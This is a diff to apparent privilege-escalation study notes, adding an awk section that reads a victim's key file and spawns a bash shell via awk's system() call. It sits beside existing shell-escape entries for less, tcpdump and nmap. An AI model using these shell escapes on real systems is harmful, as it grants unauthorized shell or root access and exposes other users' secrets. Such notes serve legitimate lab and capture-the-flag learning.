@@ -39,6 +39,7 @@ Programs:
 - Nano
 - cp
 - tcpdump
+- awk
 
 NMAP
 - nmap -V (version 4.53)
@@ -81,6 +82,13 @@ LESS
 - less /etc/passwd
 - !/bin/bash (inside)
 
+AWK
+- Reading the file can be done directly by specifying the file's path on the command line after the command: 
+awk '{print $1}' /home/victim/key.txt
+
+- To gain a shell as the user victim, you can use the following command:
+awk 'BEGIN {system("/bin/bash")}'
+
 TCPDUMP
 - tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root”
 - we have to put commands into /tmp/.test
@@ -98,6 +106,7 @@ TCPDUMP
 - export PATH
 
 - PATH=echo $PATH | sed -e 's/::/:/g; s/:.:/:/g; s/:.$//; s/^://'
+ 
  
 7. Check compiler
 - find / -name perl<em>
